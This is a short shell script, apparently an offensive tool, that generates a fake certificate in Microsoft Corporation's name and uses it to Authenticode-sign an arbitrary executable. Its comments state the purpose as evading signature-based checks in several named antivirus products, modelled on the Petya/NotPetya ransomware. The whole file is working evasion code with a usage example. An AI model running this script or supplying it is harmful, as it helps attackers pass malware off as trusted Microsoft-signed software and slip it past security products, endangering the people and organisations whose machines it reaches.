#!/bin/sh
# Sign an executable with a fake Microsoft certificate to evade PSP
# Uses a fake Microsoft certificate as exploited by Petya/NotPetya
# ransomware to bypass signature (not heuristic) checks on the following
# AvP products:
# * TrendMicro
# * Webroot
# * Malwarebytes
# * Arcabit
# * Zonealarm
# * Kaspersky
#
# Use with AppName Exe and enter password on the prompt. Requires
# mono framework installed to use "codesign" on Linux.
#
# e.g. ./bypass.sh SomeApp server.exe
openssl req -x509 -newkey rsa:4096 -keyout fake_microsoft_key.pem -out fake_microsoft_cert.pem -days 365 -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=MOPR/CN=Microsoft Corporation" 
openssl rsa -in fake_microsoft_key.pem -outform PVK -pvk-strong -out authenticode.pvk 
openssl crl2pkcs7 -nocrl -certfile fake_microsoft_cert.pem -outform DER -out authenticode.spc
signcode -spc authenticode.spc -v authenticode.pvk  -a sha1 -\$ commercial -n $1 -i http://www.microsoft.com/ -i http://timestamp.verisign.com/scripts/timestamp.dll -tr 10 $2

